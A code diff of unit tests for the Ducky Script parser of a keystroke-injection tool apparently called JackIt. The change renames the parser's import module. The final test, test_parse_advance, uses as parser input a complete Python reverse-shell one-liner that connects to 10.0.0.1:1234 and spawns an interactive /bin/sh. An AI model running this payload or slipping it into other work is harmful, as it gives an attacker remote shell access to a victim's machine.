@@ -1,16 +1,16 @@
-from jackit import jackit, keymap
+from jackit import keymap, duckyparser
 
 
 def test_char_to_hid():
     '''basic test of char to hid '''
-    dp = jackit.DuckyParser("test", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("test", keymap.mapping["us"])
     assert dp.char_to_hid('a') == [4, 0]
     assert dp.char_to_hid('A') == [4, 2]
     assert dp.char_to_hid('UP') == [82, 0]
 
 
 def test_parse_repeat():
-    dp = jackit.DuckyParser("""
+    dp = duckyparser.DuckyParser("""
 STRING Hello
 REPEAT 5
 """, keymap.mapping["us"])
@@ -42,26 +42,26 @@ REPEAT 5
 
 
 def test_parse():
-    dp = jackit.DuckyParser("test", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("test", keymap.mapping["us"])
     assert dp.parse() == []
 
-    dp = jackit.DuckyParser("GUI r\n", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("GUI r\n", keymap.mapping["us"])
     assert dp.parse() == [{'char': 'r', 'hid': 21, 'sleep': 0, 'mod': 8}]
 
 
 def test_parse_arrowkeys():
-    dp = jackit.DuckyParser('UP', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('UP', keymap.mapping["us"])
     assert dp.parse() == [{'char': 'UP', 'mod': 0, 'hid': 82, 'sleep': 0}]
-    dp = jackit.DuckyParser('DOWN', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('DOWN', keymap.mapping["us"])
     assert dp.parse() == [{'char': 'DOWN', 'mod': 0, 'hid': 81, 'sleep': 0}]
-    dp = jackit.DuckyParser('LEFT', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('LEFT', keymap.mapping["us"])
     assert dp.parse() == [{'char': 'LEFT', 'mod': 0, 'hid': 80, 'sleep': 0}]
-    dp = jackit.DuckyParser('RIGHT', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('RIGHT', keymap.mapping["us"])
     assert dp.parse() == [{'char': 'RIGHT', 'mod': 0, 'hid': 79, 'sleep': 0}]
 
 
 def test_parse_advance():
-    dp = jackit.DuckyParser("""
+    dp = duckyparser.DuckyParser("""
 STRING python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
 ENTER
     """, keymap.mapping["us"])
